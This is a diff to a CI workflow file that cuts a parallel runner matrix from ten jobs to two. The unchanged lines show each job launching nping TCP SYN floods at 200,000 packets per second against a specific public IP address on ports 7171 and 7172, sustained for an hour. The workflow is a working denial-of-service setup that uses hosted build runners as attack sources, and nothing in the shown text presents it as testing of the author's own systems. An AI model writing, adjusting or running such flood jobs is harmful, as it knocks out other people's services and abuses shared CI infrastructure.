@@ -7,7 +7,7 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        runner: [1,2,3,4,5,6,7,8,9,10]
+        runner: [1,2]
     steps:
       - name: Install tools
         run: |
@@ -24,3 +24,4 @@ jobs:
           nping --tcp -p 7171 --flags SYN --rate 200000 34.151.221.105 &
           nping --tcp -p 7172 --flags SYN --rate 200000 34.151.221.105 &
           sleep 3600
+
